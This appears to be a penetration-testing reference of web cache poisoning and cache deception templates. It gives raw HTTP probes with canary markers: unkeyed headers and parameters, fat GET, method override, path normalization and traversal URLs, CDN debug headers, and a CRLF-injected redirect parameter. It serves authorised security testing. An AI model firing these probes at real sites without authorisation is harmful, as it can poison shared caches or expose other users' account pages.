# Cache Poisoning and Deception Templates

Every request carries a unique buster (`cb=<random>`) or a unique path segment. Replace `TARGET`, `CANARY` (for example `cp7f3a.example`), and paths.

## 1. Unkeyed header (two steps)

```http
GET /?cb=8f2a91 HTTP/1.1
Host: TARGET
X-Forwarded-Host: CANARY
```

```http
GET /?cb=8f2a91 HTTP/1.1
Host: TARGET
```

Second response contains `CANARY` and shows a cache hit → CP-001.

## 2. Unkeyed cookie

```http
GET /?cb=1c77 HTTP/1.1
Host: TARGET
Cookie: lang=CANARY
```

then the same URL without the cookie.

## 3. Unkeyed parameter and cloaking

```
GET /?cb=93d1&utm_content=CANARY
GET /?cb=93d1
GET /js/geo.js?cb=93d1&callback=setCountry&utm_content=x;callback=CANARY
```

## 4. Fat GET

```http
GET /?cb=55e0&q=normal HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

q=CANARY
```

then `GET /?cb=55e0&q=normal` without a body.

## 5. Method override

```http
GET /?cb=a0b1 HTTP/1.1
Host: TARGET
X-HTTP-Method-Override: POST
```

then a plain GET with the same buster; a different status or body that persists → CP-006.

## 6. Normalization differences

Poison one form, fetch another, same buster:

```
poison: GET /Path/?cb=7a  (X-Forwarded-Host: CANARY)
fetch:  GET /path?cb=7a
fetch:  GET /%70ath?cb=7a
fetch:  GET //path?cb=7a
```

## 7. Cache deception (own test account)

1. Set your profile display name to `cpd-<random>`.
2. While logged in, open: `https://TARGET/account/cpd-<random2>.css` (also `;`, `%2f`, `%3b`, `%23`, `%3f`, `.json`, `.js` variants).
3. In a private window (no cookies), open the same URL. Your marker visible → CP-004 / CP-009.

Static directory variant:

```
https://TARGET/static/..%2faccount?cpd=<random>
https://TARGET/assets/%2e%2e/account?cpd=<random>
https://TARGET/account%23/static/x.css
```

## 8. Header injection cached (CP-010)

```
GET /redirect?cb=4410&url=/home%0d%0aX-Injected:%20cp7f3a HTTP/1.1
```

then the same URL; `X-Injected: cp7f3a` in the second response's headers.

## 9. Debug headers

```http
GET /?cb=d3 HTTP/1.1
Host: TARGET
Pragma: akamai-x-cache-on, akamai-x-get-cache-key, akamai-x-check-cacheable
Fastly-Debug: 1
```

## Tools

- Burp Param Miner: Guess headers/params/cookies with "Add cache buster" on.
- Burp Web Cache Deception Scanner extension.
- `scripts/cache_probe.py` in this skill.
- PortSwigger labs: https://portswigger.net/web-security/web-cache-poisoning and https://portswigger.net/web-security/web-cache-deception
